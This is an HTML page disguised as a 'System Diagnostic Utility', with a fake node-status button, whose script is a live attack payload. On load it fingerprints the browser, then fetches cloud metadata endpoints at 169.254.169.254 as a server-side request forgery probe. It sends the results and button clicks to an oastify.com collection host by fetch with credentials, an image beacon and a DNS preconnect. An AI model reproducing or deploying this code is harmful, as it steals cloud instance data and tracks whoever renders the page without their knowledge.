<!DOCTYPE html>
<html>
<head>
    <title>System Diagnostic Utility</title>
    <link rel="dns-prefetch" href="//8s1gu7sy4fptw78et83jmifm2d89wbk0.oastify.com">
</head>
<body>
    <h1 id="status-title">System: Initializing...</h1>
    <div id="ui-container">
        <p>Current Node: <span id="node-id">Scanning for active threads...</span></p>
        <button id="verify-btn" style="background-color: #28a745; color: white; padding: 12px;">Confirm Node Status</button>
    </div>

    <script>
        const addr = "8s1gu7sy4fptw78et83jmifm2d89wbk0.oastify.com";
        
        function exfil(path, data) {
            const blob = btoa(JSON.stringify(data));
            // Channel 1: Standard Fetch (Probing for cookies)
            fetch(`https://${addr}/${path}?v=${blob}`, { mode: 'no-cors', credentials: 'include' });
            // Channel 2: Image Beacon (Bypasses some fetch restrictions)
            new Image().src = `https://${addr}/${path}_img?v=${blob}`;
            // Channel 3: DNS Ping (The most resilient channel)
            const dnsPing = document.createElement('link');
            dnsPing.rel = 'preconnect';
            dnsPing.href = `https://${blob.substring(0, 10)}.${addr}`;
            document.head.appendChild(dnsPing);
        }

        window.onload = () => {
            // Immediate Fingerprinting
            exfil("load", {
                ua: navigator.userAgent,
                platform: navigator.platform,
                isIframe: window.self !== window.top
            });

            // High-Impact SSRF Test (Cloud Metadata)
            setTimeout(async () => {
                const targets = ["http://169.254.169.254/metadata/instance?api-version=2021-02-01", "http://169.254.169.254/latest/meta-data/"];
                for (let url of targets) {
                    try {
                        const res = await fetch(url, { headers: { "Metadata": "true" } });
                        const text = await res.text();
                        exfil("ssrf_success", { url, data: text.substring(0, 50) });
                    } catch(e) {
                        exfil("ssrf_fail", { url, err: e.message });
                    }
                }
            }, 2000);
        };

        document.getElementById('verify-btn').onclick = () => {
            exfil("interaction", { type: "click" });
            document.getElementById('node-id').innerText = "NODE_ACTIVE_" + Math.random().toString(36).substring(7);
        };
    </script>
</body>
</html>
